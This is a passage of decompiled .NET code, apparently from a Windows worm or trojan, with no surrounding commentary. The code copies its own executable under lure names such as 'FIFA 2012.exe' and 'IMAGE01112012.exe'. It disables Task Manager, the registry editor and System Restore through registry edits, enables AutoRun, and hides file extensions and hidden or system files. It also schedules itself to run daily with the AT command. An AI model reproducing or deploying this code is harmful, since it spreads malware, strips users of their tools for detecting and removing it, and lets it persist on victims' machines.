		RegistryKey registryKey7 = default(RegistryKey);
		RegistryKey registryKey8 = default(RegistryKey);
		RegistryKey registryKey9 = default(RegistryKey);
		RegistryKey registryKey10 = default(RegistryKey);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 895:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0027;
						case 4:
							goto IL_0045;
						case 5:
							goto IL_0059;
						case 6:
							goto IL_006e;
						case 7:
							goto IL_0078;
						case 8:
							goto IL_008b;
						case 9:
							goto IL_009f;
						case 10:
							goto IL_00a9;
						case 11:
							goto IL_00be;
						case 12:
							goto IL_00d4;
						case 13:
							goto IL_00df;
						case 14:
							goto IL_00f4;
						case 15:
							goto IL_010a;
						case 16:
							goto IL_0115;
						case 17:
							goto IL_012a;
						case 18:
							goto IL_0140;
						case 19:
							goto IL_014b;
						case 20:
							goto IL_0160;
						case 21:
							goto IL_0176;
						case 22:
							goto IL_0181;
						case 23:
							goto IL_0196;
						case 24:
							goto IL_01ac;
						case 25:
							goto IL_01b7;
						case 26:
							goto IL_01cb;
						case 27:
							goto IL_01e0;
						case 28:
							goto IL_01ea;
						case 29:
							goto IL_01ff;
						case 30:
							goto IL_0215;
						case 31:
							goto IL_0220;
						case 32:
							goto IL_0234;
						case 33:
							goto IL_0249;
						case 34:
							goto IL_0253;
						case 35:
							goto IL_0267;
						case 36:
							goto IL_027c;
						case 37:
							goto IL_0286;
						case 38:
							goto IL_029d;
						case 39:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 40:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_029d:
					num = 38;
					Interaction.Shell("AT /delete /yes", (AppWinStyle)0, false, -1);
					break;
					IL_0286:
					num = 37;
					text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SkyNeSySteMsCoderSs.exe";
					goto IL_029d;
					IL_000a:
					num = 2;
					File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\FIFA 2012.exe");
					goto IL_0027;
					IL_0027:
					num = 3;
					File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\IMAGE01112012.exe");
					goto IL_0045;
					IL_0045:
					num = 4;
					registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					goto IL_0059;
					IL_0059:
					num = 5;
					registryKey.SetValue("DisableTaskMgr", 1);
					goto IL_006e;
					IL_006e:
					num = 6;
					registryKey.Close();
					goto IL_0078;
					IL_0078:
					num = 7;
					registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					goto IL_008b;
					IL_008b:
					num = 8;
					registryKey2.SetValue("DisableRegistryTools", 1);
					goto IL_009f;
					IL_009f:
					num = 9;
					registryKey2.Close();
					goto IL_00a9;
					IL_00a9:
					num = 10;
					registryKey3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
					goto IL_00be;
					IL_00be:
					num = 11;
					registryKey3.SetValue("NoDriveTypeAutoRun", 0);
					goto IL_00d4;
					IL_00d4:
					num = 12;
					registryKey3.Close();
					goto IL_00df;
					IL_00df:
					num = 13;
					registryKey4 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
					goto IL_00f4;
					IL_00f4:
					num = 14;
					registryKey4.SetValue("Hidden", 0);
					goto IL_010a;
					IL_010a:
					num = 15;
					registryKey4.Close();
					goto IL_0115;
					IL_0115:
					num = 16;
					registryKey5 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
					goto IL_012a;
					IL_012a:
					num = 17;
					registryKey5.SetValue("HideFileExt", 1);
					goto IL_0140;
					IL_0140:
					num = 18;
					registryKey5.Close();
					goto IL_014b;
					IL_014b:
					num = 19;
					registryKey6 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
					goto IL_0160;
					IL_0160:
					num = 20;
					registryKey6.SetValue("ShowSuperHidden", 0);
					goto IL_0176;
					IL_0176:
					num = 21;
					registryKey6.Close();
					goto IL_0181;
					IL_0181:
					num = 22;
					registryKey7 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
					goto IL_0196;
					IL_0196:
					num = 23;
					registryKey7.SetValue("SuperHidden", 0);
					goto IL_01ac;
					IL_01ac:
					num = 24;
					registryKey7.Close();
					goto IL_01b7;
					IL_01b7:
					num = 25;
					registryKey8 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL");
					goto IL_01cb;
					IL_01cb:
					num = 26;
					registryKey8.SetValue("CheckedValue", 0);
					goto IL_01e0;
					IL_01e0:
					num = 27;
					registryKey8.Close();
					goto IL_01ea;
					IL_01ea:
					num = 28;
					registryKey9 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Installer");
					goto IL_01ff;
					IL_01ff:
					num = 29;
					registryKey9.SetValue("LimitSystemRestoreCheckpointing", 1);
					goto IL_0215;
					IL_0215:
					num = 30;
					registryKey9.Close();
					goto IL_0220;
					IL_0220:
					num = 31;
					registryKey10 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore");
					goto IL_0234;
					IL_0234:
					num = 32;
					registryKey10.SetValue("DisableSR", 1);
					goto IL_0249;
					IL_0249:
					num = 33;
					registryKey10.Close();
					goto IL_0253;
					IL_0253:
					num = 34;
					Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\Schedule");
					goto IL_0267;
					IL_0267:
					num = 35;
					registryKey10.SetValue("DisableSR", 0);
					goto IL_027c;
					IL_027c:
					num = 36;
					registryKey10.Close();
					goto IL_0286;
					end_IL_0001_2:
					break;
				}
				num = 39;
				Interaction.Shell("AT 09:00 /interactive /EVERY:m,t,w,th,f,s,su " + text, (AppWinStyle)0, false, -1);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 895;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
